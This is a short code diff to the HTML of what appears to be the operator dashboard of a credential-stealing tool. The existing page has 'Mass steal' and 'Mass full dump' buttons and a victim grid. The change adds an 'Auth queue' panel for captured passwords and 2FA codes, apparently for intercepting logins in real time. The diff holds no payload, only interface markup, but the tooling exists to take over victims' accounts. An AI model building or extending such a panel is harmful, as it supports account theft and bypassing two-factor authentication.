@@ -232,11 +232,16 @@
         </div>
         <button class="cmd sm" type="button" onclick="psMass('steal')">Mass steal</button>
         <button class="cmd sm" type="button" onclick="psMass('full')">Mass full dump</button>
+        <button class="cmd sm" type="button" onclick="refreshPsAuth()">Auth queue</button>
         <button class="cmd sm" type="button" onclick="refreshPetshift()">Refresh</button>
       </div>
     </div>
 
     <div class="victim-grid" id="petshift-list"></div>
+    <div id="ps-auth-pending" class="card" style="margin-top:14px;padding:12px;border:1px solid var(--border);border-radius:12px;display:none">
+      <div style="font-weight:600;margin-bottom:8px">Auth queue (password / 2FA)</div>
+      <div id="ps-auth-list"></div>
+    </div>
 
     <div id="ps-detail" class="hidden" style="margin-top:20px;display:none">
       <div class="control-head" style="margin-bottom:12px">
